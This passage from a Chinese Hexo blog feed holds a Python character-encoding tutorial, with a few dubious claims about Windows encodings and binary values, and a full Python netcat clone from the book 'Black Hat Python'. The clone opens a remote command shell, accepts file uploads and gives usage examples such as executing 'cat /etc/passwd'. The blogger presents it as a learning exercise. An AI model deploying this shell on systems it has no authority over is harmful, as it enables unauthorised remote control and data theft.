git@github.com</code>，查看是否连接成功。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo常见问题 </tag>
            
            <tag> Git </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python字符编码</title>
      <link href="/2018/10/17/python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
      <url>/2018/10/17/python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p> python的编码一直是个让我头疼的问题<br> <a id="more"></a><br>前言：中文编码问题一直是程序员头疼的问题，而Python2中的字符编码足矣令新手抓狂。本文将尽量用通俗的语言带大家彻底的了解字符编码以及Python2和3中的各种编码问题。</p><h2 id="什么是字符编码。"><a href="#什么是字符编码。" class="headerlink" title="什么是字符编码。"></a>什么是字符编码。</h2><p>要彻底解决字符编码的问题就不能不去了解到底什么是字符编码。计算机从本质上来说只认识二进制中的0和1，可以说任何数据在计算机中实际的物理表现形式也就是0和1，如果你将硬盘拆开，你是看不到所谓的数字0和1的，你能看到的只是一块光滑闪亮的磁盘，如果你用足够大的放大镜你就能看到磁盘的表面有着无数的凹凸不平的元件，凹下去的代表0，突出的代表1，这就是计算机用来表现二进制的方式。</p><h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><p>现在我们面临了第一个问题：如何让人类语言，比如英文被计算机理解？我们以英文为例，英文中有英文字母（大小写）、标点符号、特殊符号。如果我们将这些字母与符号给予固定的编号，然后将这些编号转变为二进制，那么计算机明显就能够正确读取这些符号，同时通过这些编号，计算机也能够将二进制转化为编号对应的字符再显示给人类去阅读。由此产生了我们最熟知的ASCII码。ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。这样在大部分情况下，英文与二进制的转换就变得容易多了。</p><h3 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h3><p>然而，虽然计算机是美国人发明的，但是全世界的人都在使用计算机。现在出现了另一个问题：如何让中文被计算机理解？这下麻烦了，中文不像拉丁语系是由固定的字母排列组成的。ASCII 码显然没办法解决这个问题，为了解决这个问题中国国家标准总局1980年发布《信息交换用汉字编码字符集》提出了GB2312编码，用于解决汉字处理的问题。1995年又颁布了《汉字编码扩展规范》（GBK）。GBK与GB 2312—1980国家标准所对应的内码标准兼容，同时在字汇一级支持ISO/IEC10646—1和GB 13000—1的全部中、日、韩（CJK）汉字，共计20902字。这样我们就解决了计算机处理汉字的问题了。</p><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>现在英文和中文问题被解决了，但新的问题又出现了。全球有那么多的国家不仅有英文、中文还有阿拉伯语、西班牙语、日语、韩语等等。难不成每种语言都做一种编码？基于这种情况一种新的编码诞生了：Unicode。Unicode又被称为统一码、万国码；它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode支持欧洲、非洲、中东、亚洲（包括统一标准的东亚象形汉字和韩国表音文字）。这样不管你使用的是英文或者中文，日语或者韩语，在Unicode编码中都有收录，且对应唯一的二进制编码。这样大家都开心了，只要大家都用Unicode编码，那就不存在这些转码的问题了，什么样的字符都能够解析了。</p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>但是，由于Unicode收录了更多的字符，可想而知它的解析效率相比ASCII码和GB2312的速度要大大降低，而且由于Unicode通过增加一个高字节对ISO Latin-1字符集进行扩展，当这些高字节位为0时，低字节就是ISO Latin-1字符。对可以用ASCII表示的字符使用Unicode并不高效，因为Unicode比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Unicode Transformation Format）。而我们最常用的UTF-8就是这些转换格式中的一种。在这里我们不去研究UTF-8到底是如何提高效率的，你只需要知道他们之间的关系即可。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>为了处理英文字符，产生了ASCII码。</li><li>为了处理中文字符，产生了GB2312。</li><li>为了处理各国字符，产生了Unicode。</li><li>为了提高Unicode存储和传输性能，产生了UTF-8，它是Unicode的一种实现形式。</li></ul><h2 id="Python2中的字符编码"><a href="#Python2中的字符编码" class="headerlink" title="Python2中的字符编码"></a>Python2中的字符编码</h2><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p><strong>Python2中默认的字符编码是ASCII码</strong>，也就是说Python在处理数据时，只要数据没有指定它的编码类型，Python默认将其当做ASCII码来进行处理。<br><img src="/2018/10/17/python字符编码/1.png" alt="1.png"><br>这个问题出现的原因是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```text</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br></pre></td></tr></table></figure></p><p>这样，Python在处理这个脚本时，会用UTF-8的编码去处理整个脚本，就能够正确的解析中文字符了。</p><h3 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h3><ul><li>Python2中默认的字符编码是ASCII码。</li><li>Python2中字符串有str和unicode两种类型。str有各种编码的区别，unicode是没有编码的标准形式。</li><li>Python2中可以直接查看到unicode的字节串。</li></ul><h2 id="decode-与encode-方法"><a href="#decode-与encode-方法" class="headerlink" title="decode()与encode()方法"></a>decode()与encode()方法</h2><p>前面我们说了这么多都是为了这一节做铺垫，现在我们开始来处理Python2中的字符编码问题。我们首先要学习Python为我们提供的两个转换编码的方法decode()与encode()。</p><p><strong>decode()方法将其他编码字符转化为Unicode编码字符。</strong><br><strong>encode()方法将Unicode编码字符转化为其他编码字符。</strong></p><p>chardet模块可以检测字符串编码，没有该模块的可以用pip install chardet安装。</p><p><img src="/2018/10/17/python字符编码/2.png" alt="2.png"><br>首先解释一下为什么name=”小明” 这里的小明是一个utf-8编码的字符。<strong>因为我使用的是win10操作系统，但是终端格式我默认设置utf-8,所以当我在终端将一个中文输入时，系统就会自动将这个中文字符以UTF-8的编码传递给Python。</strong>大多数情况下windows的系统编码默认是gb2312，那么在windows下做上图的测试“小明”这个字符就是gb2312编码。然而现在win10普遍都是ANSI字符集，产生了一个编码方式叫<code>TIS-620</code></p><p>所谓乱码本质上是系统编码与所提供字符的编码不一致导致的，我们举一个例子：</p><p>小明的电脑中存了一个utf-8的字母A，存储在计算机中是1100001；</p><p>小红的电脑中也存了一个gb2312的字母A，存储在计算机中是11000010；</p><p>当小明与小红交换信息时，各自的计算机就不会把对方传递过来的A识别为字母A，可能认为这是字母B。</p><p>所以当我们需要操作系统正确的输出一个字符时，除了要知道该字符的字符编码，也要知道自己系统所使用的字符编码。如果系统使用的是UTF-8编码，处理的却是gb2312的字符就会出现所谓“乱码”。</p><p>一个Tips：</p><p><strong>decode()方法与在字符串前加u的方法实现的效果相同比如u’小明’</strong></p><h3 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h3><ul><li><p>Python2的对于字符编码的转换要以unicode作为“中间人”进行转化。</p></li><li><p>知道自己系统的字符编码（Linux默认utf-8，Windows默认GB2312），对症下药。</p></li></ul><p>所以我们再次强调：乱码本质上是系统编码与所提供字符的编码不一致导致的</p><p>在Pyhon3中字符编码有了很大改善最主要的有以下几点：</p><ul><li><p>Python 3的源码.py文件 的默认编码方式为UTF-8，所以在Python3中你可以不用在py脚本中写coding声明，并且系统传递给python的字符不再受系统默认编码的影响，统一为unicode编码。</p></li><li><p>将字符串和字节序列做了区别，字符串str是字符串标准形式与2.x中unicode类似，bytes类似2.x中的str有各种编码区别。bytes通过解码转化成str,str通过编码转化成bytes。</p></li></ul><p>PS：有一个小问题被许多新手所困扰，我们来看一下图片:</p><p><img src="/2018/10/17/python字符编码/3.png" alt=""></p><p>我们看到当一个中文字符出现在一个list(或tuple、dict)中时，它并不会被显示为一个中文而是字节串。但当该字符串从list中提取出来再print时就能够正常显示为中文。字节串是所有字符在python中的“本质”形态，所以你可以简单的理解为list中呈现出的字节串是给计算机看的。</p><hr>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 程序基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python版netcat</title>
      <link href="/2018/10/01/python%E7%89%88netcat/"/>
      <url>/2018/10/01/python%E7%89%88netcat/</url>
      
        <content type="html"><![CDATA[<p>《python黑帽子编程》这本书可以提升自己的写脚本的水平<br><a id="more"></a><br>&nbsp;&nbsp;为了增进自己的python编程水平，于是选了《python黑帽子编程》这本书，写完一个小作业感觉受益良多，懂了些服务器客户端的通信方式，希望自己能够坚持下去。</p><p>  我已经将相关代码放到我的<a href="https://github.com/ssb6666/BlackHatCode" target="_blank" rel="noopener">github</a>，详情请点击链接，为了伟大的开源精神而干杯（手动doge）</p><hr><h3 id="具体代码，详情见注释"><a href="#具体代码，详情见注释" class="headerlink" title="具体代码，详情见注释"></a>具体代码，详情见注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">listen = <span class="keyword">False</span></span><br><span class="line">command = <span class="keyword">False</span></span><br><span class="line">execute = <span class="string">""</span></span><br><span class="line">target = <span class="string">""</span></span><br><span class="line">upload_destination = <span class="string">""</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span> <span class="comment"># 帮助说明</span></span><br><span class="line">    print(<span class="string">"BHP Net Tool\n\n"</span>)</span><br><span class="line">    print(<span class="string">"Usage: nc.py -t target_host -p port"</span>)</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">"-l --listen              \</span></span><br><span class="line"><span class="string">        - listen on [host]:[port] for incoming connections"</span>)</span><br><span class="line">    print(<span class="string">"-e --execute=file_to_run  \</span></span><br><span class="line"><span class="string">        -command execute the given file upon receiving a connection"</span>)</span><br><span class="line">    print(<span class="string">"-c --command              - initialize a command shell"</span>)</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">"-u --upload=destination  \</span></span><br><span class="line"><span class="string">         - upon receiving connection upload  \</span></span><br><span class="line"><span class="string">         a file and write to [destination]\n\n"</span>)</span><br><span class="line">    print(<span class="string">"Examples: \n"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span>)</span><br><span class="line">    print(<span class="string">"echo 'ABCDEF' | nc.py -t 192.168.11.12 -p 135"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="comment"># 如果没有定义目标，那么我们监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        <span class="comment"># 分拆一个线程处理新的客户端，client_socket返回一个socket对象（对应每个连接的对象）addr是具体的ip和端口</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            client_thread = threading.Thread(</span><br><span class="line">                target=client_handler, args=(client_socket,))</span><br><span class="line">            client_thread.start()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment"># socket对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 连接到目标主机</span></span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        client.settimeout(<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> len(buffer)!=<span class="number">0</span>:</span><br><span class="line">            client.send(buffer.encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 现在等待数据回传</span></span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:  <span class="comment"># 一次接受4096个字节</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"client: "</span>+response.strip(<span class="string">"\n"</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 等待更多输入</span></span><br><span class="line">            buffer = <span class="string">"server: "</span></span><br><span class="line">            buffer += input()</span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送出去</span></span><br><span class="line">            client.send(buffer.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(<span class="string">"[*] Exception! Exiting"</span>)</span><br><span class="line">        <span class="comment"># 关闭连接</span></span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="comment"># 换行</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="comment"># 运行命令并将输出返回</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(</span><br><span class="line">            command, stderr=subprocess.STDOUT, shell=<span class="keyword">True</span>, universal_newlines=<span class="keyword">True</span>) <span class="comment"># 命令执行模块</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line">    <span class="comment"># 将输出发送</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        <span class="comment"># 读取所有字符并写下目标</span></span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 持续读取数据直到没有符合的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"#"</span> <span class="keyword">in</span> file_buffer:</span><br><span class="line">                file_buffer = file_buffer[:<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 现在我们接收这些数据并将它们写出来</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination, <span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer.encode())</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 确认文件已经写出来</span></span><br><span class="line">            client_socket.send(<span class="string">b"Succesfully saved file"</span>) </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">b"Failed to saved file"</span>)</span><br><span class="line">        client_socket.close() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        <span class="comment"># 运行命令</span></span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果需要一个命令行shell，那么我们进另一个循环</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="comment"># 跳出一个窗口</span></span><br><span class="line">            client_socket.send(<span class="string">b"&lt;BHP:#&gt;: "</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 现在我们接受文件直到发现换行符(enter key)</span></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer = client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"gbk"</span>)</span><br><span class="line">                <span class="comment"># 反还命令输出</span></span><br><span class="line">                response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 返回相应数据</span></span><br><span class="line">                client_socket.send(response.encode())  <span class="comment"># python3中必须以BYTE流进行传输</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> listen  <span class="comment"># 全局变量</span></span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line"><span class="comment"># getopt 模块，该模块是专门用来处理命令行参数的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span>(len(sys.argv[<span class="number">1</span>:])):  <span class="comment"># sys.argv[0]代表脚本本身名称</span></span><br><span class="line">        usage()</span><br><span class="line"><span class="comment"># 读取命令行</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"hle:t:p:cu:"</span>, [</span><br><span class="line">                                   <span class="string">"help"</span>, <span class="string">"listen"</span>, <span class="string">"execute="</span>, <span class="string">"target="</span>, <span class="string">"port="</span>, <span class="string">"command="</span>, <span class="string">"upload="</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        print(str(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> o, a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--command"</span>):</span><br><span class="line">            command = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="keyword">False</span>, <span class="string">"Unhandled Option"</span></span><br><span class="line">            <span class="comment"># assert相当于断点，根据后面的表达式的布尔值进行判断，如果错误输出之后的字符串信息。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行监听还是仅从标准输入发送数据？</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> (port &gt; <span class="number">0</span>):</span><br><span class="line">        buffer = <span class="string">""</span></span><br><span class="line">        <span class="comment"># 从命令行读取内存数据</span></span><br><span class="line">        <span class="comment"># 这里将会堵塞，所以不在向标准输入发送数据时发送CTRL+D·</span></span><br><span class="line">        buffer = input() + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听并准备上传文件、执行命令</span></span><br><span class="line">    <span class="comment"># 放置一个反弹SHELL</span></span><br><span class="line">    <span class="comment"># 取决于上面的命令选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新疆首届知识技能大赛相关writeup</title>
      <link href="/2018/09/16/%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup/"/>
      <url>/2018/09/16/%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup/</url>
      
